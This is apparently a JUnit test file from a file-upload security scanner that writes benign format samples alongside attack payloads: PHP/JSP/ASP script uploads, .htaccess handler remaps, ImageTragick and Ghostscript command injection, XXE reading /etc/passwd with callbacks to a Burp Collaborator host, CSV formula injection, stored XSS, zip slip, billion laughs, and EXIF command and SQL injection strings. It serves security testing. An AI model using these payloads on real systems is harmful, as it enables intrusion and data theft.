package com.littlespidy.uploadscanner;

import com.littlespidy.uploadscanner.engine.UploadPayloadGenerator;
import com.littlespidy.uploadscanner.model.PayloadDefinition;
import com.littlespidy.uploadscanner.model.UploadScannerConfig;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.*;

import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * Generates sample files for all extensions supported by UploadScanner.
 * Populates both the project root 'samples/' directory and 'src/main/resources/samples/'.
 */
class SampleFilesGeneratorTest {

    private static final String SAMPLES_ROOT = "samples";
    private static final String RESOURCES_ROOT = "src/main/resources/samples";
    private static final String TOKEN = "UPLOAD_SCANNER_SAMPLE";
    private static final String COLLAB = "collab-test.burpcollaborator.net";

    @Test
    @DisplayName("Generate complete suite of sample files for all supported extensions")
    void generateAllSampleFiles() throws IOException {
        // 1. Clean and prepare base directories
        for (String baseDir : Arrays.asList(SAMPLES_ROOT, RESOURCES_ROOT)) {
            File base = new File(baseDir);
            base.mkdirs();
        }

        Map<String, byte[]> samples = new LinkedHashMap<>();

        // ══════════════════════════════════════════════════════════════════
        // SECTION 1: ALLOWED EXTENSIONS MATRIX (Authentic Valid Formats)
        // ══════════════════════════════════════════════════════════════════

        // Images
        samples.put("allowed-extensions/images/sample.jpg", UploadPayloadGenerator.createMinimalJpeg());
        samples.put("allowed-extensions/images/sample.jpeg", UploadPayloadGenerator.createMinimalJpeg());
        samples.put("allowed-extensions/images/sample.png", UploadPayloadGenerator.createMinimalPng());
        samples.put("allowed-extensions/images/sample.gif", UploadPayloadGenerator.createMinimalGif());
        samples.put("allowed-extensions/images/sample.webp", UploadPayloadGenerator.createMinimalWebp());
        samples.put("allowed-extensions/images/sample.bmp", UploadPayloadGenerator.createMinimalBmp());
        samples.put("allowed-extensions/images/sample.svg", ("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"100\" height=\"100\"><text x=\"10\" y=\"20\">Upload Scanner Sample</text></svg>").getBytes(StandardCharsets.UTF_8));
        samples.put("allowed-extensions/images/sample.ico", UploadPayloadGenerator.createMinimalIco());
        samples.put("allowed-extensions/images/sample.tiff", UploadPayloadGenerator.createMinimalTiff());
        samples.put("allowed-extensions/images/sample.avif", UploadPayloadGenerator.createMinimalAvif());

        // Documents
        samples.put("allowed-extensions/documents/sample.txt", ("Upload Scanner Allowed Extension Sample: txt\n").getBytes(StandardCharsets.UTF_8));
        samples.put("allowed-extensions/documents/sample.pdf", UploadPayloadGenerator.createMinimalPdf(TOKEN));
        samples.put("allowed-extensions/documents/sample.doc", UploadPayloadGenerator.createMinimalOleCfbf("doc"));
        samples.put("allowed-extensions/documents/sample.docx", UploadPayloadGenerator.createMinimalDocxBenign(TOKEN));
        samples.put("allowed-extensions/documents/sample.xls", UploadPayloadGenerator.createMinimalOleCfbf("xls"));
        samples.put("allowed-extensions/documents/sample.xlsx", UploadPayloadGenerator.createMinimalXlsxBenign(TOKEN));
        samples.put("allowed-extensions/documents/sample.ppt", UploadPayloadGenerator.createMinimalOleCfbf("ppt"));
        samples.put("allowed-extensions/documents/sample.pptx", UploadPayloadGenerator.createMinimalPptxBenign(TOKEN));
        samples.put("allowed-extensions/documents/sample.csv", ("\"Extension\",\"Type\",\"Description\"\n\"csv\",\"Document\",\"Upload Scanner Allowed Extension Sample\"\n").getBytes(StandardCharsets.UTF_8));
        samples.put("allowed-extensions/documents/sample.rtf", ("{\\rtf1\\ansi\\deff0 Upload Scanner Allowed Extension Sample: rtf}").getBytes(StandardCharsets.UTF_8));
        samples.put("allowed-extensions/documents/sample.odt", UploadPayloadGenerator.createMinimalOdtBenign(TOKEN));

        // Web & Data Formats
        samples.put("allowed-extensions/web-data/sample.json", ("{\n  \"status\": \"sample\",\n  \"extension\": \"json\",\n  \"description\": \"Upload Scanner Allowed Extension Sample\"\n}\n").getBytes(StandardCharsets.UTF_8));
        samples.put("allowed-extensions/web-data/sample.xml", ("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<sample extension=\"xml\"><description>Upload Scanner Allowed Extension Sample</description></sample>\n").getBytes(StandardCharsets.UTF_8));
        samples.put("allowed-extensions/web-data/sample.html", ("<!DOCTYPE html>\n<html>\n<head><title>Sample</title></head>\n<body><h1>Upload Scanner Allowed Extension Sample</h1></body>\n</html>\n").getBytes(StandardCharsets.UTF_8));
        samples.put("allowed-extensions/web-data/sample.js", ("// Upload Scanner Allowed Extension Sample\nconsole.log(\"Upload Scanner JavaScript Sample\");\n").getBytes(StandardCharsets.UTF_8));
        samples.put("allowed-extensions/web-data/sample.css", ("/* Upload Scanner Allowed Extension Sample */\nbody {\n  font-family: sans-serif;\n  color: #333;\n}\n").getBytes(StandardCharsets.UTF_8));
        samples.put("allowed-extensions/web-data/sample.yaml", ("sample: allowed_extension\nextension: yaml\ndescription: Upload Scanner Allowed Extension Sample\n").getBytes(StandardCharsets.UTF_8));

        // Archives
        samples.put("allowed-extensions/archives/sample.zip", UploadPayloadGenerator.createMinimalZipArchive(TOKEN));
        samples.put("allowed-extensions/archives/sample.tar", UploadPayloadGenerator.createMinimalTarArchive(TOKEN));
        samples.put("allowed-extensions/archives/sample.gz", UploadPayloadGenerator.createMinimalGzipArchive(TOKEN));
        samples.put("allowed-extensions/archives/sample.7z", UploadPayloadGenerator.createMinimal7zArchive());
        samples.put("allowed-extensions/archives/sample.rar", UploadPayloadGenerator.createMinimalRarArchive());

        // Media (Audio & Video)
        samples.put("allowed-extensions/media/sample.mp3", UploadPayloadGenerator.createMinimalMp3());
        samples.put("allowed-extensions/media/sample.wav", UploadPayloadGenerator.createMinimalWav());
        samples.put("allowed-extensions/media/sample.mp4", UploadPayloadGenerator.createMinimalMp4());
        samples.put("allowed-extensions/media/sample.avi", UploadPayloadGenerator.createMinimalAvi());
        samples.put("allowed-extensions/media/sample.mov", UploadPayloadGenerator.createMinimalMov());
        samples.put("allowed-extensions/media/sample.mkv", UploadPayloadGenerator.createMinimalMkv());
        samples.put("allowed-extensions/media/sample.ogg", UploadPayloadGenerator.createMinimalOgg());

        // ══════════════════════════════════════════════════════════════════
        // SECTION 2: SERVER-SIDE CODE EXECUTION (RCE / SCRIPT PAYLOADS)
        // ══════════════════════════════════════════════════════════════════

        samples.put("server-rce/sample.php", ("<?php echo '" + TOKEN + "'; phpinfo(); ?>\n").getBytes(StandardCharsets.UTF_8));
        samples.put("server-rce/sample.phtml", ("<?php echo '" + TOKEN + "'; ?>\n").getBytes(StandardCharsets.UTF_8));
        samples.put("server-rce/sample.php5", ("<?php echo '" + TOKEN + "'; ?>\n").getBytes(StandardCharsets.UTF_8));
        samples.put("server-rce/sample.phar", ("<?php echo '" + TOKEN + "'; __HALT_COMPILER(); ?>\n").getBytes(StandardCharsets.UTF_8));
        samples.put("server-rce/sample.jsp", ("<% out.println(\"" + TOKEN + "\"); %>\n").getBytes(StandardCharsets.UTF_8));
        samples.put("server-rce/sample-el.jsp", ("${\"" + TOKEN + "\"}\n").getBytes(StandardCharsets.UTF_8));
        samples.put("server-rce/sample.jspx", ("<jsp:root xmlns:jsp=\"http://java.sun.com/JSP/Page\" version=\"2.0\">\n  <jsp:directive.page contentType=\"text/html\"/>\n  <jsp:scriptlet>out.println(\"" + TOKEN + "\");</jsp:scriptlet>\n</jsp:root>\n").getBytes(StandardCharsets.UTF_8));
        samples.put("server-rce/sample.asp", ("<% Response.Write(\"" + TOKEN + "\") %>\n").getBytes(StandardCharsets.UTF_8));
        samples.put("server-rce/sample.aspx", ("<%@ Page Language=\"C#\" %><% Response.Write(\"" + TOKEN + "\"); %>\n").getBytes(StandardCharsets.UTF_8));
        samples.put("server-rce/sample.pl", ("#!/usr/bin/perl\nprint \"Content-Type: text/plain\\r\\n\\r\\n\";\nprint \"" + TOKEN + "\";\n").getBytes(StandardCharsets.UTF_8));
        samples.put("server-rce/sample.py", ("#!/usr/bin/env python\nprint(\"Content-Type: text/plain\\r\\n\")\nprint(\"" + TOKEN + "\")\n").getBytes(StandardCharsets.UTF_8));
        samples.put("server-rce/sample.rb", ("#!/usr/bin/ruby\nputs \"Content-Type: text/plain\\r\\n\"\nputs \"" + TOKEN + "\"\n").getBytes(StandardCharsets.UTF_8));
        samples.put("server-rce/sample.sh", ("#!/bin/bash\necho -e \"Content-Type: text/plain\\r\\n\"\necho \"" + TOKEN + "\"\n").getBytes(StandardCharsets.UTF_8));
        samples.put("server-rce/sample.shtml", ("<!--#echo var=\"DATE_LOCAL\" -->\n<!--#exec cmd=\"echo " + TOKEN + "\" -->\n<!--#include virtual=\"/etc/passwd\" -->\n").getBytes(StandardCharsets.UTF_8));
        samples.put("server-rce/sample.esi", ("<esi:include src=\"http://" + COLLAB + "/esi_callback\" />\n<esi:inline name=\"" + TOKEN + "\" fetchable=\"no\">" + TOKEN + "</esi:inline>\n").getBytes(StandardCharsets.UTF_8));

        // ══════════════════════════════════════════════════════════════════
        // SECTION 3: SERVER CONFIGURATIONS
        // ══════════════════════════════════════════════════════════════════

        samples.put("configs/.htaccess", ("AddType application/x-httpd-php .jpg\nAddHandler application/x-httpd-php .jpg\nphp_flag engine on\n").getBytes(StandardCharsets.UTF_8));
        samples.put("configs/web.config", ("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<configuration>\n  <system.webServer>\n    <handlers accessPolicy=\"Read, Script, Execute\">\n      <add name=\"PHP-FastCGI-JPG\" path=\"*.jpg\" verb=\"*\" modules=\"FastCgiModule\" scriptProcessor=\"C:\\php\\php-cgi.exe\" resourceType=\"Either\" />\n    </handlers>\n  </system.webServer>\n</configuration>\n").getBytes(StandardCharsets.UTF_8));
        samples.put("configs/.user.ini", ("auto_prepend_file = sample.jpg\n").getBytes(StandardCharsets.UTF_8));
        samples.put("configs/.env", ("APP_ENV=production\nAPP_KEY=base64:samplekey\nDB_PASSWORD=secret\n").getBytes(StandardCharsets.UTF_8));

        // ══════════════════════════════════════════════════════════════════
        // SECTION 4: IMAGE LIBRARY EXPLOITS
        // ══════════════════════════════════════════════════════════════════

        samples.put("image-libraries/sample-imagetragick.mvg", ("push graphic-context\nviewbox 0 0 640 480\nfill 'url(https://" + COLLAB + "/im_mvg\";echo \"" + TOKEN + "\";\")'\npop graphic-context\n").getBytes(StandardCharsets.UTF_8));
        samples.put("image-libraries/sample-imagetragick.svg", ("<?xml version=\"1.0\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n<svg width=\"640px\" height=\"480px\" version=\"1.1\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n  <image xlink:href=\"https://" + COLLAB + "/im_svg`echo " + TOKEN + "`\" x=\"0\" y=\"0\" height=\"640px\" width=\"640px\"/>\n</svg>\n").getBytes(StandardCharsets.UTF_8));
        samples.put("image-libraries/sample-badmanners.xbm", ("#define xbm_width 16\n#define xbm_height 16\nstatic char xbm_bits[] = {\n  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,\n  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff\n};\n").getBytes(StandardCharsets.UTF_8));
        samples.put("image-libraries/sample-delegate.msl", ("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<image>\n  <read filename=\"https://" + COLLAB + "/msl_read.jpg\" />\n  <write filename=\"/dev/null\" />\n</image>\n").getBytes(StandardCharsets.UTF_8));
        samples.put("image-libraries/sample-ghostscript-lfi.ps", ("%!PS\n/Size 20 def\n/Line 0 def\n/Buf 1024 string def\n/Path 0 newpath def\n/Courier-Bold findfont Size scalefont setfont\n1 1 1 setrgbcolor clippath fill\n0 0 0 setrgbcolor\n(/etc/passwd) .libfile {\n    {\n        dup Buf readline\n        { Path Line moveto show } { showpage quit } ifelse\n        /Line Line Size add def\n    } loop\n} if\n").getBytes(StandardCharsets.UTF_8));
        samples.put("image-libraries/sample-ghostscript-rce.eps", ("%!PS\ncurrentdevice null true mark /OutputFile (%pipe%echo " + TOKEN + ")\n.putdeviceparams\nquit\n").getBytes(StandardCharsets.UTF_8));
        samples.put("image-libraries/sample-libavformat.m3u8", ("#EXTM3U\r\n#EXT-X-MEDIA-SEQUENCE:0\r\n#EXTINF:10.0,\r\nhttp://" + COLLAB + "/libav_ssrf.mp4\r\n#EXT-X-ENDLIST\r\n").getBytes(StandardCharsets.UTF_8));

        // ══════════════════════════════════════════════════════════════════
        // SECTION 5: XML & DOCUMENT ATTACKS
        // ══════════════════════════════════════════════════════════════════

        samples.put("xml-documents/sample-xxe.svg", ("<?xml version=\"1.0\" standalone=\"no\"?>\n<!DOCTYPE svg [\n  <!ENTITY % dtd SYSTEM \"http://" + COLLAB + "/svg_collab.dtd\">\n  %dtd;\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<svg width=\"300\" height=\"300\" xmlns=\"http://www.w3.org/2000/svg\">\n  <text x=\"20\" y=\"50\" font-size=\"16\">&xxe;</text>\n</svg>\n").getBytes(StandardCharsets.UTF_8));
        samples.put("xml-documents/sample-xxe.xml", ("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE root [\n  <!ENTITY % oob SYSTEM \"http://" + COLLAB + "/xml_xxe\">\n  %oob;\n  <!ENTITY file SYSTEM \"file:///etc/passwd\">\n]>\n<root><data>&file;</data></root>\n").getBytes(StandardCharsets.UTF_8));
        samples.put("xml-documents/sample-xxe.docx", UploadPayloadGenerator.createOfficeDocxXxe(COLLAB));
        samples.put("xml-documents/sample-xxe.xmp", ("<?xpacket begin=\"\uFEFF\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?>\n<!DOCTYPE rdf:RDF [\n  <!ENTITY % xmp_collab SYSTEM \"http://" + COLLAB + "/xmp_xxe\">\n  %xmp_collab;\n]>\n<x:xmpmeta xmlns:x=\"adobe:ns:meta/\">\n  <rdf:RDF xmlns:rdf=\"http://www.w3.org/1999/02/22-rdf-syntax-ns#\"/>\n</x:xmpmeta>\n<?xpacket end=\"w\"?>\n").getBytes(StandardCharsets.UTF_8));
        samples.put("xml-documents/sample-javascript.pdf", ("%PDF-1.4\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R /OpenAction << /S /JavaScript /JS (app.alert('" + TOKEN + "');) >> >>\nendobj\n2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>\nendobj\nxref\n0 4\n0000000000 65535 f \n0000000009 00000 n \n0000000100 00000 n \n0000000155 00000 n \ntrailer\n<< /Size 4 /Root 1 0 R >>\nstartxref\n225\n%%EOF\n").getBytes(StandardCharsets.US_ASCII));
        samples.put("xml-documents/sample-callback.pdf", ("%PDF-1.7\n1 0 obj <</Type/Catalog/Pages 2 0 R>> endobj\n2 0 obj <</Type/Pages/Kids[3 0 R]/Count 1>> endobj\n3 0 obj <</Type/Page/Parent 2 0 R/AA <</O <</F (http://" + COLLAB + "/pdf_read)/D [0 /Fit]/S /GoToE>>>>>> endobj\ntrailer <</Size 4/Root 1 0 R>>\nstartxref\n180\n%%EOF\n").getBytes(StandardCharsets.US_ASCII));
        samples.put("xml-documents/sample-formula.csv", ("=cmd|' /C calc'!A0\n@SUM(1+1)*cmd|' /C calc'!A0\n-2+3+cmd|' /C nslookup " + COLLAB + "'!A0\n\"" + TOKEN + "\",\"FormulaTest\"\n").getBytes(StandardCharsets.UTF_8));

        // ══════════════════════════════════════════════════════════════════
        // SECTION 6: CLIENT-SIDE & CSP POLYGLOTS
        // ══════════════════════════════════════════════════════════════════

        samples.put("client-side/sample-stored-xss.html", ("<!DOCTYPE html>\n<html>\n<body>\n  <h1>Upload Test</h1>\n  <script>alert('" + TOKEN + "');</script>\n  <img src=x onerror=\"alert('" + TOKEN + "')\">\n</body>\n</html>\n").getBytes(StandardCharsets.UTF_8));
        samples.put("client-side/sample-stored-xss.svg", ("<?xml version=\"1.0\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n<svg version=\"1.1\" baseProfile=\"full\" xmlns=\"http://www.w3.org/2000/svg\">\n   <polygon id=\"triangle\" points=\"0,0 0,50 50,0\" fill=\"#009900\" stroke=\"#004400\"/>\n   <script type=\"text/javascript\">\n      alert('" + TOKEN + "');\n   </script>\n</svg>\n").getBytes(StandardCharsets.UTF_8));
        samples.put("client-side/sample-flash-xss.swf", UploadPayloadGenerator.createSwfPayload(TOKEN));
        samples.put("client-side/sample-csp-polyglot.jpg", UploadPayloadGenerator.createJpegCspPolyglot());
        samples.put("client-side/sample-csp-polyglot.gif", UploadPayloadGenerator.createGifCspPolyglot());

        // Image + PHP Polyglots
        String gifPhp = "GIF89a/*\u0000\u0001\u0000\u0001\u0080\u0000\u0000\u0000\u0000\u0000\u00ff\u00ff\u00ff!\u00f9\u0004\u0001\u0000\u0000\u0000\u0000,*/=1; " +
                "/*\u0000\u0000\u0000\u0000\u0001\u0000\u0001\u0000\u0000\u0002\u0002D\u0001\u0000; " +
                "*/\n<?php echo '" + TOKEN + "'; ?>\n";
        samples.put("client-side/sample-php-polyglot.gif", gifPhp.getBytes(StandardCharsets.ISO_8859_1));

        byte[] pngHeader = new byte[] {
                (byte) 0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A,
                0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44, 0x52,
                0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01,
                0x08, 0x06, 0x00, 0x00, 0x00, 0x1F, 0x15, (byte) 0xC4, (byte) 0x89
        };
        byte[] phpSnippet = ("\n<?php echo '" + TOKEN + "'; ?>\n").getBytes(StandardCharsets.UTF_8);
        byte[] pngPoly = new byte[pngHeader.length + phpSnippet.length];
        System.arraycopy(pngHeader, 0, pngPoly, 0, pngHeader.length);
        System.arraycopy(phpSnippet, 0, pngPoly, pngHeader.length, phpSnippet.length);
        samples.put("client-side/sample-php-polyglot.png", pngPoly);

        // ══════════════════════════════════════════════════════════════════
        // SECTION 7: ARCHIVES, QUIRKS & DOS
        // ══════════════════════════════════════════════════════════════════

        samples.put("archives-quirks/sample-zipslip.zip", UploadPayloadGenerator.createZipSlipArchive(TOKEN));
        samples.put("archives-quirks/sample-symlink.tar", UploadPayloadGenerator.createTarSymlinkArchive("/etc/passwd"));
        samples.put("archives-quirks/sample-eicar.txt", ("X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*\n").getBytes(StandardCharsets.US_ASCII));
        samples.put("archives-quirks/sample-pixelflood.png", UploadPayloadGenerator.createPixelFloodPng());
        samples.put("archives-quirks/sample-billionlaughs.xml", ("<?xml version=\"1.0\"?>\n<!DOCTYPE lolz [\n <!ENTITY lol \"lol\">\n <!ENTITY lol1 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">\n <!ENTITY lol2 \"&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;\">\n <!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">\n <!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\">\n <!ENTITY lol5 \"&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;\">\n]>\n<lolz>&lol5;</lolz>\n").getBytes(StandardCharsets.UTF_8));
        samples.put("archives-quirks/sample-trailing-dot.php.", ("<?php echo '" + TOKEN + "'; ?>\n").getBytes(StandardCharsets.UTF_8));
        samples.put("archives-quirks/sample-mixed-case.PhP", ("<?php echo '" + TOKEN + "'; ?>\n").getBytes(StandardCharsets.UTF_8));
        samples.put("archives-quirks/sample-nullbyte.php%00.png", ("<?php echo '" + TOKEN + "'; ?>\n").getBytes(StandardCharsets.UTF_8));
        samples.put("archives-quirks/sample-double-ext.php.jpg", ("<?php echo '" + TOKEN + "'; ?>\n").getBytes(StandardCharsets.UTF_8));
        samples.put("archives-quirks/sample-iis-semicolon.asp;.jpg", ("<% Response.Write(\"" + TOKEN + "\") %>\n").getBytes(StandardCharsets.UTF_8));

        // ══════════════════════════════════════════════════════════════════
        // SECTION 8: EXIF METADATA SAMPLES
        // ══════════════════════════════════════════════════════════════════

        Map<String, String> piiTags = new HashMap<>();
        piiTags.put("Make", "LittleSpidy Phone 1.0");
        piiTags.put("Model", "AuditProbe 1.0");
        piiTags.put("Artist", "LittleSpidy Security Canary");
        piiTags.put("Software", "UploadScanner_littlespidy");
        piiTags.put("ImageDescription", "CANARY_EXIF_LEAK_TEST_" + TOKEN);
        samples.put("exif-metadata/sample-exif-canary.jpg", UploadPayloadGenerator.createJpegWithExif(piiTags, 37.7749, -122.4194));

        Map<String, String> pngPii = new HashMap<>();
        pngPii.put("Author", "LittleSpidy Security Canary");
        pngPii.put("Comment", "GPS: 37.7749,-122.4194 canary " + TOKEN);
        samples.put("exif-metadata/sample-exif-canary.png", UploadPayloadGenerator.createPngWithTextChunks(pngPii));

        Map<String, String> xssTags = new HashMap<>();
        xssTags.put("Artist", "\"><script>alert('EXIF_XSS_" + TOKEN + "')</script>");
        xssTags.put("ImageDescription", "<img src=x onerror=alert('EXIF_XSS_" + TOKEN + "')>");
        samples.put("exif-metadata/sample-exif-xss.jpg", UploadPayloadGenerator.createJpegWithExif(xssTags, Double.NaN, Double.NaN));

        Map<String, String> cmdTags = new HashMap<>();
        cmdTags.put("Artist", "$(whoami);id;echo " + TOKEN);
        cmdTags.put("Model", ";whoami;");
        samples.put("exif-metadata/sample-exif-cmd.jpg", UploadPayloadGenerator.createJpegWithExif(cmdTags, Double.NaN, Double.NaN));

        Map<String, String> sqliTags = new HashMap<>();
        sqliTags.put("Artist", "' OR '1'='1' -- " + TOKEN);
        sqliTags.put("ImageDescription", "admin' --");
        samples.put("exif-metadata/sample-exif-sqli.jpg", UploadPayloadGenerator.createJpegWithExif(sqliTags, Double.NaN, Double.NaN));

        // ══════════════════════════════════════════════════════════════════
        // Write all sample files to disk
        // ══════════════════════════════════════════════════════════════════

        int writtenCount = 0;
        for (String baseDir : Arrays.asList(SAMPLES_ROOT, RESOURCES_ROOT)) {
            for (Map.Entry<String, byte[]> entry : samples.entrySet()) {
                File targetFile = new File(baseDir, entry.getKey());
                targetFile.getParentFile().mkdirs();
                try (FileOutputStream fos = new FileOutputStream(targetFile)) {
                    fos.write(entry.getValue());
                }
                writtenCount++;
            }
        }

        System.out.println("Successfully generated " + samples.size() + " unique sample files across 2 target locations (total files written: " + writtenCount + ")");
        assertTrue(samples.size() >= 50, "Expected at least 50 sample files to be generated");
    }
}
